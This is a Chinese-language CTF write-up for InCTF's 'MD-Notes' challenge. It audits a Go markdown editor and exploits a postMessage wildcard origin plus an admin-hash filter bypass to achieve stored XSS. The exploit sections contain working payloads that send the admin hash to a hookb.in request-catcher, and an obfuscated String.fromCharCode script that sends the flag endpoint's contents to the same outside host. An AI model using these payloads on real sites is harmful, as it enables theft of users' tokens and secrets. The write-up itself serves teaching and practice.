# MD-Notes


​	后端编写语言：GO

​	前端编写语言：HTML && JavaScript

​	本地镜像搭建：因为众所周知的原因，我们在国内拉取Go依赖镜像时相当的慢，并且有可能根本无法进行连接下载，我们需要在`Dockerfile`中或使用Go本身去配置代理选项的使用。通过在终端上或在`Dockerfile`中执行下面的语句我们可以配置国内代理，

```dockerfile
RUN go env -w GOPROXY="https://goproxy.cn,direct"
```



#### 业务逻辑分析与代码审查

​	代理配置完后我们直接来看题目，直接进入到`http://localhost:8080/`；页面布局很简单，简要的看上去是一个支持`markdown`格式的在编辑器，支持在线预览（Preview）与后端保存（Save）功能。

{{< image src="https://image.p1nant0m.xyz/image-20210927142057006.png" caption="题目页面展示" src_s="https://image.p1nant0m.xyz/image-20210927142057006.png" src_l="https://image.p1nant0m.xyz/image-20210927142057006.png" >}}

​	我们随便的在编辑框中输入一点内容看看效果，

{{< image src="https://image.p1nant0m.xyz/image-20210927142309716.png" caption="尝试输入特殊字符" src_s="https://image.p1nant0m.xyz/image-20210927142309716.png" src_l="https://image.p1nant0m.xyz/image-20210927142309716.png" >}}

​	可以看到我们输入的内容被进行了过滤编码，`<`标签开闭合符号显然就在其中，我们考虑是否有某种方式绕过过滤实现`XSS`,单击保存后我们可以看到下列提示，

{{< image src="https://image.p1nant0m.xyz/image-20210927142537265.png" caption="保存后提示" src_s="https://image.p1nant0m.xyz/image-20210927142537265.png" src_l="https://image.p1nant0m.xyz/image-20210927142537265.png" >}}

​	进入提示的路径我们可以看到我们输入的经过过滤后的信息。

​	InCTF为我们提供了一个adminBot，我们可以让它来访问我们提供的页面，考虑是**CORS**，利用某种方式绕过过滤器继而提交并且存储XSS注入后的恶意页面(Stored XSS）获得`admin`浏览器中的敏感信息。

​	接下来我们开始分析代码

​	审计`server.go`源码，我们发现了对应的路由及其相关方法，

```go
	route.PathPrefix("/static/").Handler(http.StripPrefix("/static/", fs))
	route.HandleFunc("/", indexHandler)
	route.HandleFunc("/demo", previewHandler).Methods("GET")
	route.HandleFunc("/api/flag", flag).Methods("GET")
	route.HandleFunc("/api/filter", filterHandler).Methods("POST")
	route.HandleFunc("/api/create", createHandler).Methods("POST")
	route.HandleFunc("/{bucketid}/{postid}", previewHandler).Methods("GET")
	route.HandleFunc("/_debug", debug).Methods("GET")
```

​	`/`路由到`/index.html`，在`index.html`中我们发现preview所提供的功能是通过`<iframe>`导入进来的并且应用了一个Script文件（`/static/app.js`）， `15-20`行

```html
                <div class="col-md-6">
                    <textarea id="input-area" class="form-control"></textarea>
                </div>
                <div class="col-md-6">
                    <iframe id="frame-area" src="/demo" width="500" height="300"></iframe>
                </div>
```

​	`/static/app.js`中定义了我们单击Preview与Save所对应的事件处理逻辑，

```js
preview.onclick = function() {
    console.log("Sending Preview..")
	frame.contentWindow.postMessage(textarea.value, `http://${document.location.host}/`); 
	return false;
}
```

​	我们在Docs中查找`contentWindow.postMessage()`的用法：

> ​	**window.postMessage()**方法可以安全地实现跨源通信。通常，对于两个不同页面的脚本，只有当执行它们的页面位于具有相同的协议（通常为https），端口号（443为https的默认值），以及主机 (两个页面的模数 [`Document.domain`](https://developer.mozilla.org/zh-CN/docs/Web/API/Document/domain)设置为相同的值) 时，这两个脚本才能相互通信。**window.postMessage()** 方法提供了一种受控机制来规避此限制，**只要正确的使用，这种方法就很安全**。
>
> ​	从广义上讲，一个窗口可以获得对另一个窗口的引用（比如 `targetWindow = window.opener`），然后在窗口上调用 `targetWindow.postMessage()` 方法分发一个  [`MessageEvent`](https://developer.mozilla.org/zh-CN/docs/Web/API/MessageEvent) 消息。接收消息的窗口可以根据需要自由[处理此事件 (en-US)](https://developer.mozilla.org/en-US/docs/Web/Events)。传递给 window.postMessage() 的参数（比如 message ）将[通过消息事件对象暴露给接收消息的窗口](https://developer.mozilla.org/zh-CN/docs/Web/API/Window/postMessage#The_dispatched_event)。

​	**语法使用**

> otherWindow.postMessage(message, targetOrigin, [transfer]);

`otherWindow`

其他窗口的一个引用，比如iframe的contentWindow属性、执行[window.open](https://developer.mozilla.org/en-US/docs/Web/API/Window/open)返回的窗口对象、或者是命名过或数值索引的[window.frames](https://developer.mozilla.org/en-US/docs/Web/API/Window/frames)。

`message`

将要发送到其他 window的数据。它将会被[结构化克隆算法](https://developer.mozilla.org/en-US/docs/DOM/The_structured_clone_algorithm)序列化。这意味着你可以不受什么限制的将数据对象安全的传送给目标窗口而无需自己序列化。[[1](https://developer.mozilla.org/en-US/docs/)]

`targetOrigin`

​	通过窗口的origin属性来指定哪些窗口能接收到消息事件，其值可以是字符串"*"（**表示无限制**）或者一个URI。在发送消息的时候，如果目标窗口的协议、主机地址或端口这三者的任意一项不匹配targetOrigin提供的值，那么消息就不会被发送；只有三者完全匹配，消息才会被发送。这个机制用来控制消息可以发送到哪些窗口；例如，当用postMessage传送密码时，这个参数就显得尤为重要，必须保证它的值与这条包含密码的信息的预期接受者的origin属性完全一致，来防止密码被恶意的第三方截获。**如果你明确的知道消息应该发送到哪个窗口，那么请始终提供一个有确切值的targetOrigin，而不是\*。不提供确切的目标将导致数据泄露到任何对数据感兴趣的恶意站点。**

​	上述代码中使用`http://${document.location.host}/`作为`targetOrigin`限定了`message`中的信息只能被回传至本页面中`index.html`，由`input-area`向`frame-area`传递



​	在`preview.js`中设置了一个`messageEvent`监听器，当`windows`事件触发`message`事件时会回调用本函数，

```js
window.addEventListener("message", (event) => {
    console.log("Previewing..")
	let raw = event.data // input-area data

	fetch("/api/filter", {
		method: "POST",
		credentials: "include",
		body: JSON.stringify({
			raw: raw
		})
	})
    .then(resp => resp.json())
	.then(response => {
		console.log("Filtered")
		document.body.innerHTML = response.Sanitized
		window.parent.postMessage(response, "*"); 
	}); 
}, false);
```

> ​	**EventTarget.addEventListener()** 方法将指定的监听器注册到 [`EventTarget`](https://developer.mozilla.org/zh-CN/docs/Web/API/EventTarget) 上，当该对象触发指定的事件时，指定的回调函数就会被执行。 事件目标可以是一个文档上的元素 [`Element`](https://developer.mozilla.org/zh-CN/docs/Web/API/Element),[`Document`](https://developer.mozilla.org/zh-CN/docs/Web/API/Document)和[`Window`](https://developer.mozilla.org/zh-CN/docs/Web/API/Window)或者任何其他支持事件的对象 (比如 `XMLHttpRequest`)`。`
>
> ```
> target.addEventListener(type, listener, options);
> 
> type
> 表示监听事件类型的字符串。 
> 
> listener
> 当所监听的事件类型触发时，会接收到一个事件通知（实现了 Event 接口的对象）对象。listener 必须是一个实现了 EventListener 接口的对象，或者是一个函数。有关回调本身的详细信息，请参阅The event listener callback 
> ```

​	事件类型参考：https://developer.mozilla.org/zh-CN/docs/Web/Events

​	该函数将RawData发送至后端GoAPI接口`/api/filter`中，在这里实现过滤逻辑

`server.go` 	{140-171}

```GO
func filterHandler(w http.ResponseWriter, r *http.Request) {
	reqBody, _ := ioutil.ReadAll(r.Body)
	w.Header().Set("Content-Type", "application/json")
	var unsanitized Unsanitized

	err := json.Unmarshal(reqBody, &unsanitized)

	if err != nil {

		log.Println("Error decoding JSON. err = %s", err)
		fmt.Fprintf(w, "Error decoding JSON.")

	} else {
		var cookie, isset = r.Cookie("Token")

		hash, token := createToken() // 生成Token并使用Cookies存储

		sanitized_data := markdown.ToHTML([]byte(sanitize(unsanitized.Raw)), nil, nil) // 过滤RawData
        // 这里应该是远程生成adminBot身份时用的，因为isset=nil时cookie.Value的值也不应该存在
		if isset == nil {
			if cookie.Value == CONFIG.admin_token {
				hash = CONFIG.admin_hash
				token = CONFIG.admin_token
			}
		}

		cookie = &http.Cookie{Name: "Token", Value: token, HttpOnly: true, Path: "/api"} // 设置Cookies
		result := Sanitized{Sanitized: string(sanitized_data), Raw: unsanitized.Raw, Hash: hash} // 返回的JSON
		http.SetCookie(w, cookie) 
        json.NewEncoder(w).Encode(result) // {Sanitized, Raw, Hash} 这里向前端返回了Hash用于后续的Save操作
	}
}
```

​	我们能够在前端Console中查看后端返回的Data，使用`data`，

{{< image src="https://image.p1nant0m.xyz/image-20210927160743166.png" caption="后端返回的 Data" src_s="https://image.p1nant0m.xyz/image-20210927160743166.png" src_l="https://image.p1nant0m.xyz/image-20210927160743166.png" >}}

​	注意到这里的Cookie被设置了为`HttpOnly`，这导致我们无法使用脚本去获取Cookie的值，

> ​	JavaScript [`Document.cookie`](https://developer.mozilla.org/zh-CN/docs/Web/API/Document/cookie) API 无法访问带有 `HttpOnly` 属性的cookie；此类 Cookie 仅作用于服务器。例如，持久化服务器端会话的 Cookie 不需要对 JavaScript 可用，而应具有 `HttpOnly` 属性。此预防措施有助于缓解[跨站点脚本（XSS） (en-US)](https://developer.mozilla.org/en-US/docs/Web/Security/Types_of_attacks)攻击。

​	从后端返回的Sanitized_Data被直接写入到HTMLBODY中，通过`document.body.innerHTML`设置，这样便可以确保被浏览器渲染的代码是安全的。

​	在`preview.js`中有一段对破题具有十分重要提示的代码

​																				`window.parent.postMessage(response, "*"); `  

​	这里的targetOrigin被设置为了`*`，这意味着任何载入该`frame`的页面都能够收到此`response`（response: {Sanitized, Raw, **Hash**}）

> ​	我们能够构造一段恶意的Script，在HTML中载入/demo的frame，接着让adminBot访问该页面，我们就能够获取admin身份下，response中的Hash，这段Hash的作用在之后的分析中还会提及。

恶意Script代码的构造，

```html
<script>
    function exploit() {
        document.getElementById("iframe").contentWindow.postMessage("Hello","*")
    }

    window.addEventListener("message",(event)=>{
        var img = new Image();
        img.src = "https://hookb.in/NOP1yLbpQwSe8mNN8mR2?hash=" + encodeURIComponent(event.data.Hash);
    },false);
</script>
<iframe src="http://localhost:8080/demo" id="iframe" onload="exploit()"></iframe>
```

​	当admin用户访问该网页时，其HASH将会被我们获取，这样我们便实现了一次CORS

​	在这段代码`filterHandler`中还调用了`createToken()`，我们来看看token生成的过程，

`server.go`  	{63-69}

```go
func createToken() (string, string) {
	token, _ := uuid.NewV4() // 随机生成一个UUID （字符串）
	h := sha256.New()
	h.Write([]byte(token.String() + CONFIG.secret)) // CONFIG.secret = os.Getenv("SECRET") = "REDACTED"
	sha256_hash := hex.EncodeToString(h.Sum(nil))
	return string(sha256_hash), token.String()
}
```

> ​	uuid是Universally Unique Identifier的缩写，即通用唯一识别码。
>
> ​	uuid的目的是让分布式系统中的所有元素，都能有唯一的辨识资讯，而不需要透过中央控制端来做辨识资讯的指定。如此一来，每个人都可以建立不与其它人冲突的 uuid。A universally unique identifier (UUID) is a 128-bit number used to identify information in computer systems.

​	`h.Write([]byte(token.String() + CONFIG.secret))` 告诉了我们$HASH$函数的输入



​	至此我们已分析完毕preview点击时的逻辑，并且给出了一段能够实现CORS获取adminHash的恶意代码



​	当我们单击Save时，将会执行下列代码，

`app.js` {18-43}

```js
save.onclick = function() {
	if (token == undefined)
	{
		alert("Preview before saving!")
	} else {
		fetch("/api/create", {
			method: "POST",
			credentials: "include",
			body: JSON.stringify({
				Hash: token,
				Raw: textarea.value
			})
		}).then(resp => resp.json())
		.then(response => {
            if (response["Status"] != "success") {
                alert("Could not save markdown.")
            } else {
                alert("Saved post to : " + response["Bucket"] + "/" + response["PostId"])
                frame.src = `http://${document.location.host}/${response['Bucket']}/${response["PostId"]}`
            }
			console.log(response)
			token = undefined
		}); 
	}
	return false; 
}
```

​	前端向后端Go服务器的`/api/create`接口提交了一个POST请求，其中的参数为当前用户执行Preview操作时获取的Hash和用户输入的Raw_data（未经过滤），该ElementID由`input-area`指示。下面我们将审计`server.go createHandler()`代码，

`server.go createHandler()` {173-215}

```go
func createHandler(w http.ResponseWriter, r *http.Request) {
	reqBody, _ := ioutil.ReadAll(r.Body)
	w.Header().Set("Content-Type", "application/json")

	type Response struct {
		Status string
		PostId int
		Bucket string
	}
	var createpost CreatePost

	if json.Unmarshal(reqBody, &createpost) != nil {
		log.Println("There was an error decoding json. \n")
		json.NewEncoder(w).Encode(Response{Status: "Save Error"})
	} else {
		var cookie, err = r.Cookie("Token")

		if err == nil {
			var token = cookie.Value
			if verifyToken(token, createpost.Hash) || (createpost.Hash == CONFIG.admin_hash) {
				bucket := CONFIG.admin_bucket
				data := createpost.Raw

				if createpost.Hash != CONFIG.admin_hash {
					id, _ := uuid.NewV4()
					bucket = id.String()
					data = string(markdown.ToHTML([]byte(sanitize(data)), nil, nil))
				} else {
					data = string(markdown.ToHTML([]byte(data), nil, nil)) // 使用adminHash提交的data不会被过滤！
				}

				postid := save_post(bucket, data)
				log.Println("Saved post to", postid)
				json.NewEncoder(w).Encode(Response{Status: "success", Bucket: bucket, PostId: postid})
			} else {
				log.Println("Verification failed for ", createpost.Hash, token)
				json.NewEncoder(w).Encode(Response{Status: "Token not verified"})
			}
		} else {
			json.NewEncoder(w).Encode(Response{Status: "Invalid body."})
		}
	}
}
```

​	在前面我们已经获取了admin的Hash，现在我们只要需要简单的在Post数据项中加入adminHash便可绕过filter，实现Stored XSS。我们的目标时获取服务器中存储的FLAG，通过代码审计我们可以知道当我们Cookies中`Token = admin_token`时便可以获取FLAG，且FLAG就为`admin_token`，由于我们并不知道`admin_token`的值所以并不能通过更改本地的Cookies来实现对`/api/flag`接口的访问，但是我们可以让admin访问我们上传的恶意代码后将其token发送回我们控制的Web服务器中，下面是我们恶意脚本的构造，

```html
<script>
    fetch(String.fromCharCode(47, 97, 112, 105, 47, 102, 108, 97, 103))
    .then(function(response) {
        var img = new Image();
        img.src = String.fromCharCode(104, 116, 116, 112, 115, 58, 47, 47, 104, 111, 
        111, 107, 98, 46, 105, 110, 47, 75, 51, 120, 88, 101, 76, 74, 79, 111, 109, 
        72, 80, 77, 75, 56, 56, 77, 75, 86, 55, 63, 102, 108, 97, 103, 61) // 攻击者控制的Web服务器 e.g. http://localhost:8888?flag=
        + encodeURIComponent(response.text());
    })
</script>
```

`server.go flag` {217-228}

```go
func flag(w http.ResponseWriter, r *http.Request) {
	var cookie, err = r.Cookie("Token")
	res := Preview{Error: "", Data: "'"}
	if err == nil {
		if cookie.Value == CONFIG.admin_token {
			res.Data = template.HTML(CONFIG.admin_token) // 直接将FLAG渲染进HTML 我们只要获取document.body即可
		} else {
			res.Data = template.HTML("You are not admin.")
		}
	}
	previewTmpl.Execute(w, res)
}
```



#### Exploit

​	获取adminHash,

```html
<script>
    function exploit() {
        document.getElementById("iframe").contentWindow.postMessage("Hello","*")
    }

    window.addEventListener("message",(event)=>{
        var img = new Image();
        img.src = "https://hookb.in/NOP1yLbpQwSe8mNN8mR2?hash=" + encodeURIComponent(event.data.Hash);
    },false);
</script>
<iframe src="http://localhost:8080/demo" id="iframe" onload="exploit()"></iframe>
```

​	通知AdminBot访问我们构造的恶意页面，获取其Hash

​	使用AdminHash提交我们的恶意脚本，提交代码如下，

```python
import requests

session = requests.Session()
headers = {
    'Cookie': 'Token=2333',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36'
}
Hash = 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855'
payload = '<script>fetch(String.fromCharCode(47, 97, 112, 105, 47, 102, 108, 97, 103)).then(function(response) {return response.text();}).then(function (text) {var img = new Image();img.src = String.fromCharCode(104,116,116,112,115,58,47,47,104,111,111,107,98,46,105,110,47,75,51,120,88,101,76,74,79,111,109,72,80,77,75,56,56,77,75,86,55,63,102,108,97,103,61) + encodeURIComponent(text);})</script>'
paramPost = {
    'Hash': Hash,
    'Raw': payload
}
resp = session.post('http://localhost:8080/api/create',
                    json=paramPost, headers=headers)
print(resp.content)
```

​	恶意脚本如下（获取FLAG）

```html
<script>
    fetch(String.fromCharCode(47, 97, 112, 105, 47, 102, 108, 97, 103))
    .then(function(response) {
        var img = new Image();
        img.src = String.fromCharCode(104, 116, 116, 112, 115, 58, 47, 47, 104, 111, 
        111, 107, 98, 46, 105, 110, 47, 75, 51, 120, 88, 101, 76, 74, 79, 111, 109, 
        72, 80, 77, 75, 56, 56, 77, 75, 86, 55, 63, 102, 108, 97, 103, 61) // 攻击者控制的Web服务器
        + encodeURIComponent(response.text());
    })
</script>
```



​	当Admin访问我们的页面时（`/REDACTED/0`），我们的恶意Script将会被执行，形成 Stored XSS。

{{< image src="https://image.p1nant0m.xyz/image-20210927190809809.png" caption="访问恶意页面触发脚本执行" src_s="https://image.p1nant0m.xyz/image-20210927190809809.png" src_l="https://image.p1nant0m.xyz/image-20210927190809809.png" >}}

​	我们注入的恶意脚本就从数据库中导出并且构成HTML文档的一部分，被浏览器解释执行，

{{< image src="https://image.p1nant0m.xyz/image-20210927191107611.png" caption="恶意代码拼接进入 HTML 文档" src_s="https://image.p1nant0m.xyz/image-20210927191107611.png" src_l="https://image.p1nant0m.xyz/image-20210927191107611.png" >}}

​	最终我们可以在受我们控制的服务器中获得我们的FLAG，

{{< image src="https://image.p1nant0m.xyz/image-20210927191308837.png" caption="flag 获取" src_s="https://image.p1nant0m.xyz/image-20210927191308837.png" src_l="https://image.p1nant0m.xyz/image-20210927191308837.png" >}}


#### 总结

​	一些常用的Payload

`html`

```html
<img src="YOUR SERVER" onerror="exploit()"> <!-- 可以用于提交数据或者执行脚本-->
<iframe src="URL" onload="exploit()"> <!-- 加载iframe时并且允许脚本 -->
```

`JavaScript`

```js
var img = new Image();
img.src = "" // 创建img标签

fetch('http://').then(function(response)=>{
                      // do something
                      })
target.addEventListener("type (message)", (event)=>{
                        // do something
                        },false);
document.getElementByID("") // 返回一个匹配特定ID的元素
String.fromCharCode() // 绕过过滤器

// 对字符串内容进行转义防止在构造URL时产生分歧 e.g. 某个Key的Value为 &time=0001 若不进行转义该Value将会被看作为一个新的K-V对
encodeURIComponent("") 

otherWindow.postMessage(message, targetOrigin, [transfer]); // 一种Data传递的方式，必须严格限定targetOrigin的值
```

​	一些概念：Stored XSS，CORS，Go，targetOrigin，同源策略，UUID，

